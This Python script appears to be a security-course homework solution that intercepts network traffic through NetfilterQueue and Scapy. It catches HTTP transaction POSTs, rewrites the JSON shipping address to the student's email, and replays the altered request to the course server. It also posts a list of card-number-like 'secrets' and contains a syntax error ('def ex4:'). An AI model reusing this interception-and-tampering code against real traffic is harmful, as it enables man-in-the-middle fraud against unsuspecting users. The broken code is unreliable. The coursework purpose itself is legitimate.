from netfilterqueue import NetfilterQueue
from scapy.all import *
import json
import requests
    
def print_raw_bytes(pkt):
    print(pkt.get_payload())
    
def parse_raw(raw):
    ip = IP(raw)
    

    if ip.haslayer(TCP):
        tcp = ip[TCP]
        
        if tcp.haslayer(Raw):
            raw = ip[Raw]
            http = ip[Raw].load.decode('utf-8')
            json_data = http.split('\r\n')[-1]
            if http.split('\r\n')[0] == 'POST /hw1/ex4/transaction HTTP/1.1':
                json_http =  json.loads(json_data)
                print('json: ',json_http)
                json_http['shipping_address'] ='mateusz.paluchowski@epfl.ch'

                r = requests.post("http://com402.epfl.ch/hw1/ex3/shipping", json=json_http)
                print(r.text)
                print(r.status_code)
            

def print_layers(raw):
    pkt = IP(raw)
    layers = []
    counter = 0
    while True:
        layer = pkt.getlayer(counter)
        if (layer != None):
            # print(layer.name)
            layers.append(layer.name)
        else:
            break
        counter += 1

    print("Layers are:\t\t",layers)
    
def ex4:
    json_post = {
        "student_email": 'mateusz.paluchowski@epfl.ch',
        "secrets": ['6362/2041/1684/0232', '8950/7681/4557/0068', '1462.5149.1750.0563', '>D>98C7BR46?HD', 'XQY?<:=SWU646']
    }
    r = requests.post("http://com402.epfl.ch/hw1/ex4/sensitive", json=json_post)
    print(r.text)
    print(r.status_code)

def print_and_accept(pkt):
    # print_layers(pkt.get_payload())
    parse_raw(pkt.get_payload())
    pkt.accept()

def print_and_drop(pkt):
    # print(pkt)
    # parse_raw(pkt.get_payload())
    print_layers(pkt.get_payload())
    pkt.drop()


nfqueue = NetfilterQueue()
nfqueue.bind(0, print_and_accept, 100)
try:
    nfqueue.run()
except KeyboardInterrupt:
    print('')

nfqueue.unbind()